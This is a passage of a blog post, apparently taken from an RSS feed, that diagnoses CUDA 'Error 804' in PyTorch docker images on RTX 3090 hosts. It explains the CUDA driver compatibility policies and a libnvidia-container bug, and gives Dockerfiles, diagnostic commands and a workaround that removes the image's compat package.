      <content:encoded><![CDATA[<p >Several users reported to encounter <code>&quot;Error 804: forward compatibility was attempted on non supported HW&quot;</code> during the usage of some customized PyTorch docker images on our GPU cluster.</p><p >At first glance I recognized the culprit to be a version mismatch between installed driver on the host and required driver in the image. The corrupted images as they described were built targeting <code>CUDA == 11.3</code> with a corresponding driver version <code>== 465</code> <sup id="fnref:1"><a href="#fn:1">1</a></sup>, while some of our hosts are shipped with driver version <code>460</code>. As a solution I told them to downgrade the targeting CUDA version by choosing a base image such as <code>nvidia/cuda:11.2.0-devel-ubuntu18.04</code>, which indeed well solved the problem.</p><p >But later on I suspected the above hypothesis being the real cause. An observed counterexample was that another line of docker images targeting even higher CUDA version would run normally on those hosts, for example, the latest <code>ghcr.io/pytorch/pytorch:2.0.0-devel</code> built for <code>CUDA == 11.7</code>. This won’t be the case if CUDA version mismatch truly matters.</p><p >Afterwards I did a bit of research concerning the problem and learnt some interesting stuff which this post is going to share. In short, <strong>the recently released minor version compatibility allows applications built for newer CUDA to run on machines with some older drivers, but libnvidia-container doesn’t correcly handle it due to <a href="https://github.com/NVIDIA/libnvidia-container/issues/138">a bug</a> and eventually leads to such an error</strong>.</p><p >Towards thorough comprehension, this post will first introduce the constitution of CUDA components, following with the compatibility policy of different components, and finally unravel the bug and devise a workaround for it. But before diving deep, I’ll give two Dockerfile samples to illustrate the problem.</p><h1 id="reproduction-samples">Reproduction Samples</h1><p >The host reported as problematic has 8x GeForce RTX 3090 with driver version <code>460.67</code> and CUDA <code>11.2</code>. Here is an image with <code>torch == 1.12.1</code> built for CUDA <code>11.3</code> and fails on the host:</p><div class="gk-code hljs" data-gk-id="dockerfile_bad_old" data-gk-title="Dockerfile_bad"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">FROM</span> nvidia/cuda:<span class="hljs-number">11.3</span>.<span class="hljs-number">0</span>-cudnn8-devel-ubuntu20.<span class="hljs-number">04</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update -y &amp;&amp; apt install -y python3 python3-pip</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install torch==1.12.1+cu113 --extra-index-url https://download.pytorch.org/whl/cu113</span></span><br><span class="line"><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import torch; print(torch.rand(2, 3).cuda())&quot;</span>]</span></span><br></pre></div></div><p  class="par"> By contrast below is an image with <code>torch == 2.0.0</code> built for CUDA <code>11.7</code> and runs normally:</p><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="Dockerfile_good"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">FROM</span> ghcr.io/pytorch/pytorch:<span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>-devel</span><br><span class="line"><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import torch; print(torch.rand(2, 3).cuda())&quot;</span>]</span></span><br></pre></div></div><p  class="par"> For convenience I also write a <code>Makefile</code> to combine the process of building and running either image:</p><div class="gk-code hljs" data-gk-id="BLOCK2" data-gk-title="Makefile"><div class="gk-code-display"><pre><span class="line"><span class="hljs-section">good:</span></span><br><span class="line">      docker build -t good -&lt; Dockerfile_good</span><br><span class="line">      docker run --gpus=&#x27;<span class="hljs-string">&quot;device=0&quot;</span>&#x27; --rm -it good</span><br><span class="line"><span class="hljs-section">bad:</span></span><br><span class="line">      docker build -t bad -&lt; Dockerfile_bad</span><br><span class="line">      docker run --gpus=&#x27;<span class="hljs-string">&quot;device=0&quot;</span>&#x27; --rm -it bad</span><br></pre></div></div><p  class="par"> With the <code>Makefile</code> you can run <code>make good</code> or <code>make bad</code> to see respective results:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make good</span></span><br><span class="line">tensor([[0.1245, 0.2403, 0.9967],</span><br><span class="line">        [0.5950, 0.1597, 0.1985]], device=&#x27;cuda:0&#x27;)</span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make bad</span></span><br><span class="line">&lt;string&gt;:1: UserWarning: Failed to initialize NumPy: numpy.core.multiarray failed to import (Triggered internally at  ../torch/csrc/utils/tensor_numpy.cpp:68.)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;/usr/local/lib/python3.8/dist-packages/torch/cuda/__init__.py&quot;, line 217, in _lazy_init</span><br><span class="line">    torch._C._cuda_init()</span><br><span class="line">RuntimeError: Unexpected error from cudaGetDeviceCount(). Did you run some cuda functions before calling NumCudaDevices() that might have already set an error? Error 804: forward compatibility was attempted on non supported HW</span><br><span class="line">make: *** [bad] Error 1</span><br></pre></div></div><p >We start off touring from the constitution of CUDA.</p><h1 id="components-of-cuda">Components of CUDA</h1><p >When talked about the term “CUDA”, two concepts “CUDA Toolkit” and “NVIDIA Display Drivers” are usually mixed up. This figure <sup id="fnref:2"><a href="#fn:2">2</a></sup> illustrates their distinction as well as the cascading relationship:</p><p  class="par"> <img loading="lazy" src="https://docs.nvidia.com/deploy/cuda-compatibility/graphics/CUDA-components.png" alt="Components of CUDA"></p><p  class="par"> The driver at low level bridges the communication between softwares and underlying NVIDIA hardwares. The toolkit instead lies at a higher level to provide convenience for easy GPU programming.</p><p >If we take a closer look at the driver, we can see it decomposed into two secondary components “user-mode driver or UMD (<code>libcuda.so</code>)” and “kernel-mode driver or KMD (<code>nvidia.ko</code>)”. The KMD runs in OS kernel to do the most intimate contact with the hardware, while the UMD as an abstraction provides API to communicate with the kernel driver.</p><p >Generally, the applications compiled by CUDA toolkit will dynamically search and link <code>libcuda.so</code> during starting, which under the hood dispatches user requests to the kernel as illustrated below:</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="640" height="56pt" viewBox="0 0 480.44 55.76"><g class="graph"><path fill="none" d="M0 55.76V0h480.44v55.76z"/><g class="node" transform="translate(4 51.76)"><path fill="#fff5ee" stroke="#444" d="m50.1-8.18 2.81-.08 2.78-.13 2.74-.17 2.69-.22 2.63-.25 2.55-.3 2.47-.33 2.38-.38 2.28-.41 2.17-.45 2.05-.48 1.93-.52 1.8-.55 1.67-.59 1.52-.61 1.38-.64 1.24-.67 1.09-.69.94-.71.78-.74.64-.75.49-.77.34-.79.2-.79.05-.81-.09-.81-.22-.82-.35-.83-.48-.82-.6-.83-.71-.82-.83-.81-.92-.81-1.03-.79-1.11-.79-1.2-.77-1.28-.75-1.35-.74-1.42-.71-1.47-.69-1.54-.67-1.58-.64-1.62-.61-1.67-.59-1.7-.55-1.73-.52-1.75-.48-1.78-.45-1.8-.41-1.82-.38-1.83-.33-1.84-.3-1.86-.25-1.86-.22-1.86-.17-1.87-.13-1.88-.08-1.87-.05h-1.88l-1.87.05-1.88.08-1.87.13-1.86.17-1.86.22-1.86.25-1.84.3-1.83.33-1.82.38-1.8.41-1.78.45-1.75.48-1.73.52-1.7.55-1.67.59-1.63.61-1.58.64-1.53.67-1.48.69-1.41.71-1.35.74-1.28.75-1.2.77-1.11.79-1.03.79-.92.81-.83.81-.71.82-.6.83-.48.82-.35.83-.22.82-.09.81.05.81.2.79.34.79.49.77.63.75.79.74.94.71 1.09.69 1.23.67 1.39.64 1.52.61 1.67.59 1.8.55 1.93.52 2.05.48 2.17.45 2.28.41 2.38.38 2.47.33 2.55.3 2.63.25 2.69.22 2.74.17 2.78.13 2.81.08 2.82.05h2.84z"/><text x="22.61" y="-19.83" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">binaries</text></g><g class="node" transform="translate(4 51.76)"><path fill="#fff5ee" stroke="#444" d="m223.51-.07 3.75-.13 3.7-.19 3.65-.26 3.59-.33 3.5-.38 3.4-.45 3.29-.51 3.17-.57 3.04-.62 2.89-.68 2.73-.74 2.58-.79 2.39-.83 2.22-.89 2.03-.93 1.85-.97 1.64-1.01 1.45-1.05 1.25-1.08 1.05-1.12.85-1.14.65-1.17.46-1.19.26-1.2.07-1.23-.12-1.23-.29-1.25-.47-1.24-.64-1.26-.8-1.24-.95-1.25-1.1-1.23-1.23-1.23-1.37-1.2-1.48-1.19-1.6-1.17-1.7-1.14-1.8-1.12-1.89-1.08-1.97-1.05-2.04-1.01-2.11-.97-2.16-.93-2.22-.89-2.27-.83-2.3-.79-2.34-.74-2.37-.68-2.4-.62-2.42-.57-2.44-.51-2.46-.45-2.47-.38-2.48-.33-2.48-.26-2.49-.19-2.5-.13-2.5-.07h-2.5l-2.5.07-2.5.13-2.49.19-2.49.26-2.47.33-2.47.38-2.46.45-2.44.51-2.42.57-2.4.62-2.37.68-2.34.74-2.31.79-2.26.83-2.22.89-2.17.93-2.1.97-2.04 1.01-1.97 1.05-1.89 1.08-1.8 1.12-1.7 1.14-1.6 1.17-1.48 1.19-1.37 1.2-1.23 1.23-1.1 1.23-.95 1.25-.8 1.24-.64 1.26-.47 1.24-.29 1.25-.12 1.23.07 1.23.26 1.2.45 1.19.66 1.17.85 1.14 1.04 1.12 1.25 1.08 1.45 1.05 1.65 1.01 1.84.97 2.04.93 2.21.89 2.4.83 2.57.79 2.74.74 2.89.68 3.04.62 3.17.57 3.29.51 3.4.45 3.5.38 3.58.33 3.66.26 3.7.19 3.74.13 3.77.07h3.78z"/><text x="188.61" y="-25.58" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">libcuda.so</text><text x="184.48" y="-11.58" fill="#444" font-family="Times New Roman,serif" font-size="14">[user-mode]</text></g><g class="edge" transform="translate(4 51.76)"><path fill="none" stroke="#444" d="M91.05-23.88H146"/><path fill="#444" stroke="#444" d="m145.93-27.38 10 3.5-10 3.5z"/><text x="124.23" y="-28.63" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">link against</text></g><g class="node" transform="translate(4 51.76)"><path fill="#fff5ee" stroke="#444" d="m409.3-.07 4.26-.13 4.22-.19 4.16-.26 4.08-.33 3.98-.38 3.88-.45 3.75-.51 3.6-.57 3.46-.62 3.29-.68 3.12-.74 2.92-.79 2.74-.83 2.52-.89 2.32-.93 2.09-.97 1.88-1.01 1.65-1.05 1.42-1.08 1.2-1.12.97-1.14.74-1.17.51-1.19.3-1.2.08-1.23-.13-1.23-.34-1.25-.53-1.24-.73-1.26-.91-1.24-1.08-1.25-1.25-1.23-1.41-1.23-1.55-1.2-1.69-1.19-1.82-1.17-1.94-1.14-2.05-1.12-2.15-1.08-2.24-1.05-2.32-1.01-2.4-.97-2.47-.93-2.52-.89-2.58-.83-2.63-.79-2.67-.74-2.7-.68-2.73-.62-2.75-.57-2.78-.51-2.8-.45-2.81-.38-2.82-.33-2.83-.26-2.84-.19-2.84-.13-2.85-.07h-2.84l-2.85.07-2.84.13-2.84.19-2.83.26-2.82.33-2.81.38-2.8.45-2.78.51-2.75.57-2.74.62-2.7.68-2.66.74-2.63.79-2.58.83-2.52.89-2.47.93-2.4.97-2.32 1.01-2.24 1.05-2.15 1.08-2.05 1.12-1.94 1.14-1.82 1.17-1.69 1.19-1.55 1.2-1.41 1.23L337-27l-1.08 1.25-.91 1.24-.73 1.26-.53 1.24-.34 1.25-.13 1.23.08 1.23.3 1.2.51 1.19.74 1.17.97 1.14 1.2 1.12 1.42 1.08 1.65 1.05 1.87 1.01 2.1.97 2.32.93 2.52.89 2.73.83 2.93.79 3.12.74 3.29.68 3.45.62 3.61.57 3.75.51 3.88.45 3.98.38 4.08.33 4.16.26 4.22.19 4.26.13 4.29.07h4.3z"/><text x="375.86" y="-25.58" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">nvidia.ko</text><text x="363.86" y="-11.58" fill="#444" font-family="Times New Roman,serif" font-size="14">[kernel-mode]</text></g><g class="edge" transform="translate(4 51.76)"><path fill="none" stroke="#444" d="M278.18-23.88h44.74"/><path fill="#444" stroke="#444" d="m322.77-27.38 10 3.5-10 3.5z"/><text x="306.12" y="-28.63" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">talk with</text></g></g></svg></figure><p  class="nomargin"> So far so good, if only the compiler in toolkit agrees on APIs with the targeting driver.</p><p >Sadly, that is not the norm. In real world, developers compile the programs on one machine and dispatch them to run on others, expecting those programs compiled by a specific version of CUDA toolkit could run on a wide variety of hardwares, or otherwise users would complain about the corrupted binaries.</p><p >Towards this guarantee, several compatibility policies are induced.</p><h1 id="cuda-compatibility-policies">CUDA Compatibility Policies</h1><p >Before we introduce the policies, we should know about how the components are versioned. The CUDA toolkit and the drivers adopt different version schemes, with the toolkit versioned like <code>11.2</code> and drivers like <code>460.65</code>. Therefore, “driver 460.65” refers to the version of <code>libcuda.so</code> and <code>nvidia.ko</code>; similarly, when somebody says “CUDA 11.2”, it’s <em>the toolkit version</em> being mentioned.</p><p >NVIDIA devises multiple rules to ensure user binaries would work on a wide range of driver-hardware combinations, which can be grouped into two categories, i.e., <strong>toolkit-driver compatibility</strong> and <strong>UMD-KMD compatibility</strong>.</p><h2 id="toolkit-driver-compatibility">Toolkit-driver compatibility</h2><p >These policies constrain that <strong>binaries compiled by a specific CUDA toolkit can run on what version of driver</strong>.</p><p >Basically we have the <strong>“Backward Compatibility”</strong>. Each CUDA toolkit has a so-called toolkit driver version <sup id="fnref:3"><a href="#fn:3">3</a></sup>. Binaries compiled by that toolkit are guaranteed to run on drivers newer than the toolkit driver version. For example, the toolkit driver version of CUDA 11.2 is 460.27.03, which means binaries compiled by CUDA 11.2 should work on any driver &gt;= 460.27.03. This is the most fundamental and agelong policy.</p><p >From CUDA 11 onwards, another policy named <a href="https://docs.nvidia.com/deploy/cuda-compatibility/#minor-version-compatibility"><strong>“Minor Version Compatibility”</strong></a> <sup id="fnref:4"><a href="#fn:4">4</a></sup> was proposed. This policy allows binaries compiled by toolkits with the same major version to a the same driver version requirement. For example, binaries compiled by CUDA 11.0 would work on driver &gt;= 450.36.06. Since CUDA 11.2 has the same major version with CUDA 11.0, binaries compiled by CUDA 11.2 could also work on driver &gt;= 450.36.06 <sup id="fnref:5"><a href="#fn:5">5</a></sup>.</p><p >The backward compatibility ensures compiled binaries would work on machines shipped with drivers of future version, while the minor version compatibility reduces the necessity of upgrading drivers to run some newly compiled binaries. Generally, a binary compiled by CUDA toolkit $X.Y$ should work with driver with version $M$, if either of the following satisfies:</p><ol><li>CUDA toolkit $X.Y$ has toolkit driver version $N$ and $M \geq N$;</li><li>$X \geq 11$ and a CUDA toolkit $X.Y_2$ has toolkit driver version $N_2$ and $M \geq N_2$.</li></ol><p >However, the above policies only consider the relationship between CUDA toolkit and drivers. What if the user-mode and kernel-mode drivers have diverged version? This is where <strong>UMD-KMD compatibility</strong> applies.</p><h2 id="umd-kmd-compatibility">UMD-KMD compatibility</h2><p >In ideal case, kernel-mode driver should always work with user-mode driver with the same version. But upgrading kernel-mode drivers is sometimes tricky and troublesome, of which some users such as data center admins could not take the risk. Towards this consideration, NVIDIA devised the <a href="https://docs.nvidia.com/deploy/cuda-compatibility/#forward-compatibility-title"><strong>“Forward Compatibility”</strong></a> to allow old-versioned KMD to cooperate with new-versioned UMD under some circumstance.</p><p >Specifically, a kernel-mode driver would support all user-mode drivers releases during its lifetime. For instance, the driver 418.x has end of life (EOL) in March 2022, before which driver 460.x was released, then KMD 418.x would work with UMD 460.x. The compatibility does not involve anything at a higher level such as CUDA toolkit.</p><p >It’s worth noting that, this policy <strong>does not apply to all GPU hardwares</strong> but only a fraction of them. NVIDIA has limited forward compatibility to be applicable for systems with NVIDIA Data Center GPUs (the Tesla branch) or <a href="https://docs.nvidia.com/ngc/ngc-deploy-on-premises/ngc-ready-systems/index.html">NGC Server Ready</a> SKUs of RTX cards <sup id="fnref:6"><a href="#fn:6">6</a></sup>. If you own a GeForce RTX 3090, like in my scenario, you won’t enjoy this stuff.</p><h2 id="summary-of-compatibility">Summary of Compatibility</h2><p >Let’s make a quick review for the various types of compatibility policies. If you have a binary compiled by CUDA $X.Y$, a host with UMD (<code>libcuda.so</code>) versioned $M$ and KMD (<code>nvidia.ko</code>) versioned $M&#39;$, then they would work fine if both of the two conditions hold:</p><ol><li>The UMD and KMD is compatible. Specifically, either<ol><li>the GPU supports forward compatibility (Tesla branch or NGC ready), and driver $M$ comes before the EOL of driver $M&#39;$ (<strong>the forward compatibility</strong>); or</li><li>$M = M&#39;$.</li></ol></li><li>The CUDA toolkit and UMD is compatible. Specifically, either<ol><li>CUDA toolkit $X.Y$ has toolkit driver version $N$ and $M \geq N$ (<strong>the backward compatibility</strong>); or</li><li>major version $X \geq 11$ and there exists another toolkit $X.Y_2$ with toolkit driver version $N_2$ and $M \geq N_2$ (<strong>the minor version compatibility</strong>).</li></ol></li></ol><p  class="par"> Generally, validating the above conditions should help whenever you run in any compatibility problems.</p><h1 id="back-to-our-problem">Back to Our Problem</h1><p >So, what’s wrong with the docker image <code>bad</code>? With above rules in hands we can perform a simple analysis.</p><p >Could it be a toolkit-driver incompatibility? Probably NO. According to Table. 1 <a href="https://docs.nvidia.com/deploy/cuda-compatibility/#default-to-minor-version">here</a>, the minor version compatibility applies with CUDA 11.x and driver &gt;= 450.80.02, which our driver version 460 satisfies, let alone binary compiled by CUDA 11.7 working like a charm in the case of docker image <code>good</code>.</p><p >It should be due to a KMD-UMD incompatibility, namely, the version of <code>libcuda.so</code> and <code>nvidia.ko</code> is incompatible. Since forward compatibility is not applicable for RTX 3090, we are expecting condition 1.2 holds, where <code>libcuda.so</code> and <code>nvidia.ko</code> should have the same version – this obviously was not the case.</p><h2 id="how-nvidia-driver-works-with-docker">How nvidia driver works with docker?</h2><p >A process in a container is technically a special process on the host, which shares the same model as other processes do to interact with GPU drivers. Since KMD runs in kernel and not interfered by user space, all programs regardless of on host or in containers are communicate with the same KMD.</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="296" height="70pt" viewBox="0 0 222.05 70.26"><g class="graph"><path fill="none" d="M0 70.26V0h222.05v70.26z"/><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M206.18-62.26h-93.9V-40h93.9z"/><text x="119.48" y="-47.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">host program</text></g><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M68.4-42.26H0V-20h68.4z"/><text x="7.2" y="-27.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">nvidia.ko</text></g><g class="edge" transform="translate(4 66.26)"><path fill="none" stroke="#444" d="M112.07-43.63c-10.62 1.73-21.89 3.56-32.43 5.27"/><path fill="#444" stroke="#444" d="M80.48-34.95 70.05-36.8l9.31-5.05z"/></g><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M214.05-22.26H104.4V0h109.65z"/><text x="111.6" y="-7.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">docker program</text></g><g class="edge" transform="translate(4 66.26)"><path fill="none" stroke="#444" d="M103.91-19.96c-8.05-1.31-16.26-2.64-24.07-3.91"/><path fill="#444" stroke="#444" d="m79.53-20.38-9.31-5.06 10.44-1.85z"/></g></g></svg></figure><p  class="nomargin"> By contrast, a program can flexibly choose which user-mode driver to link against. It can either link to the UMD installed along with the KMD on the host, or brings its own UMD during packaging and distribution.</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="344pt" height="70pt" viewBox="0 0 344.45 70.26"><g class="graph"><path fill="none" d="M0 70.26V0h344.45v70.26z"/><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M328.57-62.26h-93.89V-40h93.89z"/><text x="241.88" y="-47.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">host program</text></g><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M190.8-62.26h-86.4V-40h86.4z"/><text x="111.6" y="-47.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">libcuda.so.X</text></g><g class="edge" transform="translate(4 66.26)"><path fill="none" stroke="#444" d="M234.45-51.13h-32.13"/><path fill="#444" stroke="#444" d="m202.51-47.63-10-3.5 10-3.5z"/></g><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M68.4-42.26H0V-20h68.4z"/><text x="7.2" y="-27.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">nvidia.ko</text></g><g class="edge" transform="translate(4 66.26)"><path fill="none" stroke="#444" d="M104.17-43.51c-7.85 1.41-16.08 2.88-24 4.31"/><path fill="#444" stroke="#444" d="m80.81-35.76-10.46-1.68 9.22-5.21z"/></g><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M336.45-22.26H226.8V0h109.65z"/><text x="234" y="-7.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">docker program</text></g><g class="node" transform="translate(4 66.26)"><path fill="#fff5ee" stroke="#444" d="M190.8-22.26h-86.4V0h86.4z"/><text x="111.6" y="-7.08" fill="#444" font-family="Times New Roman,serif" font-size="14" font-weight="bold">libcuda.so.Y</text></g><g class="edge" transform="translate(4 66.26)"><path fill="none" stroke="#444" d="M226.54-11.13h-24.06"/><path fill="#444" stroke="#444" d="m202.6-7.63-10-3.5 10-3.5z"/></g><g class="edge" transform="translate(4 66.26)"><path fill="none" stroke="#444" d="M104.17-18.75c-7.85-1.41-16.08-2.88-24-4.31"/><path fill="#444" stroke="#444" d="m79.57-19.61-9.22-5.21 10.46-1.68z"/></g></g></svg></figure><p  class="nomargin"> We can list out all the UMDs in a running <code>good</code> container with the command:</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run --gpus=<span class="hljs-string">&#x27;&quot;device=0&quot;&#x27;</span> --<span class="hljs-built_in">rm</span> -it --entrypoint= good bash</span></span><br><span class="line">root@3a19f802a459:/workspace# find / -name &#x27;libcuda.so*&#x27; -exec bash -c &quot;echo {} -\&gt; \`readlink {}\`&quot; \; 2&gt;/dev/null</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libcuda.so.1 -&gt; libcuda.so.460.67</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libcuda.so -&gt; libcuda.so.1</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libcuda.so.460.67 -&gt;</span><br></pre></div></div><p  class="nomargin"> Looks like there is only one copy of <code>libcuda.so</code> that lies in <code>/usr/lib/x86_64-linux-gnu/</code> with version 460.67. However, such <code>libcuda.so</code> was not packed with the docker image from the beginning. The library disappears if you omit the <code>--gpus</code> argument:</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run --<span class="hljs-built_in">rm</span> -it --entrypoint= good bash</span></span><br><span class="line">root@3a19f802a459:/workspace# find / -name &#x27;libcuda.so*&#x27; -exec bash -c &quot;echo {} -\&gt; \`readlink {}\`&quot; \; 2&gt;/dev/null</span><br><span class="line">root@3a19f802a459:/workspace#</span><br></pre></div></div><p  class="par"> In fact, the library exists on the host and is injected into the container by docker runtime during the startup. <a href="https://zhuanlan.zhihu.com/p/361545761">This post</a> demonstrates the injection process by viewing docker’s log. Mounting <code>libcuda.so</code> from the host will maximally ensures the KMD-UMD correspondence aligned.</p><p >Now that the docker runtime would choose a native UMD, why did the image <code>bad</code> fail?</p><h2 id="the-internal-of-image-bad">The internal of image <code>bad</code></h2><p >We can likewise check the UMDs in a running <code>bad</code> container as belows:</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run --gpus=<span class="hljs-string">&#x27;&quot;device=0&quot;&#x27;</span> --<span class="hljs-built_in">rm</span> -it --entrypoint= bad bash</span></span><br><span class="line">root@15f9b3c915b8:/# find / -name &#x27;libcuda.so*&#x27; -exec bash -c &quot;echo {} -\&gt; \`readlink {}\`&quot; \; 2&gt;/dev/null</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libcuda.so.465.19.01 -&gt;</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libcuda.so.1 -&gt; libcuda.so.465.19.01</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libcuda.so -&gt; libcuda.so.1</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libcuda.so.460.67 -&gt;</span><br><span class="line">/usr/local/cuda-11.3/compat/libcuda.so.465.19.01 -&gt;</span><br><span class="line">/usr/local/cuda-11.3/compat/libcuda.so.1 -&gt; libcuda.so.465.19.01</span><br><span class="line">/usr/local/cuda-11.3/compat/libcuda.so -&gt; libcuda.so.1</span><br><span class="line">/usr/local/cuda-11.3/targets/x86_64-linux/lib/stubs/libcuda.so -&gt;</span><br></pre></div></div><p  class="par"> OOPS!!! Looks like there’s big difference here. We could derive two observations from the result:</p><ol><li>There is already a <code>libcuda.so</code> bundled inside the image at <code>/usr/local/cuda-11.3/compat/libcuda.so.465.19.01</code>, with a higher version of <code>465.19.01</code>.</li><li>During startup, both the native <code>libcuda.so.460.67</code> and the bundled <code>libcuda.so.465.19.01</code> are symlinked under <code>/usr/lib/x86_64-linux-gnu/</code>, and most importantly, <strong>it’s the bundled one being linked as <code>libcuda.so</code> and chosen by the program</strong>.</li></ol><p  class="par"> <strong>And that is the reason why the docker image <code>bad</code> violates KMD-UMD compatibility!</strong></p><h1 id="the-bug-of-libnvidia-container">The bug of libnvidia-container</h1><p >Such misbehavior is a consequence of a bug of <code>libnvidia-container</code>. But before we talk about it, let’s take a step back to see what the directory <code>/usr/local/cuda-X/compat</code> does and why should it exist.</p><p >Actually the <code>compat</code> directory is part of the CUDA compat package, according to the <a href="https://docs.nvidia.com/deploy/cuda-compatibility/#installing-title">official docs</a>, which exists to support the forward compatibility <sup id="fnref:7"><a href="#fn:7">7</a></sup>. The official base image <code>nvidia/cuda:11.3.0-cudnn8-devel-ubuntu20.04</code> had this package built in, which contains a higher version UMD <code>libcuda.so.465.19.01</code> in case of an older-versioned KMD running on the host. As aforementioned, to apply forward compatibility there exists requirement on the underlying hardware. When the requirement unsatisfied, such as for our RTX 3090 GPUs, the <code>libcuda.so</code> from compat package should hopefully not be linked against.</p><p >Unfortunately, current release of nvidia-docker <strong>would roughly attempt to apply forward compatibility, regardless of whether the GPUs meet the limitation</strong>.</p><p >The problem was encountered and studied by Gemfield who posted an article <a href="https://zhuanlan.zhihu.com/p/361545761">PyTorch 的 CUDA 错误：Error 804: forward compatibility was attempted on non supported HW</a> as explanation. Gemfield observed nvidia-docker would simultaneously symlink both the native UMD on host and the compat UMD in docker image under <code>/usr/lib/x86_64-linux-gnu/</code>, and brutely choose the one with higher version as the <code>libcuda.so.1</code>, against which user programs would link.</p><p >Obviously this behavior is neither in line with forward compatibility nor with minor version compatibility. Gemfield opened an issue <a href="https://github.com/NVIDIA/nvidia-docker/issues/1515">NVIDIA/nvidia-docker#1515</a> for discussion, where the author <a href="https://github.com/NVIDIA/nvidia-docker/issues/1515#issuecomment-872975880">guessed</a> it was a bug of libnvidia-container and another issue <a href="https://github.com/NVIDIA/libnvidia-container/issues/138">NVIDIA/libnvidia-container#138</a> was referred. Both issues are not yet resolved up till now.</p><p >The workaround is simple – if there’s no compat package, the compat UMD won’t be applied. We can either remove the compat package or brutely delete the <code>/usr/local/cuda-X/compat</code> directory to let it work:</p><div class="gk-unified-code diff"><div class="gk-code hljs" data-gk-id="DIFF1" data-gk-title="DIFF"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">FROM</span> nvidia/cuda:<span class="hljs-number">11.3</span>.<span class="hljs-number">0</span>-cudnn8-devel-ubuntu20.<span class="hljs-number">04</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update -y &amp;&amp; apt install -y python3 python3-pip</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install torch==1.12.1+cu113 --extra-index-url https://download.pytorch.org/whl/cu113</span></span><br><span class="gk-section gk-diff-add" data-gk-sid="DIFF1.SEC1" data-gk-type="diff-add"><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt purge cuda-compat-11-3 -y</span></span><br><span class="line"><span class="hljs-comment"># OR</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rfv /usr/local/cuda-11.3/compat/</span></span><br></span><span class="line"><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import torch; print(torch.rand(2, 3).cuda())&quot;</span>]</span></span><br></pre></div></div><div class="gk-code hljs" data-gk-id="dockerfile_bad_old:1" data-gk-title="Dockerfile_bad"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">FROM</span> nvidia/cuda:<span class="hljs-number">11.3</span>.<span class="hljs-number">0</span>-cudnn8-devel-ubuntu20.<span class="hljs-number">04</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update -y &amp;&amp; apt install -y python3 python3-pip</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install torch==1.12.1+cu113 --extra-index-url https://download.pytorch.org/whl/cu113</span></span><br><span class="line"><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span 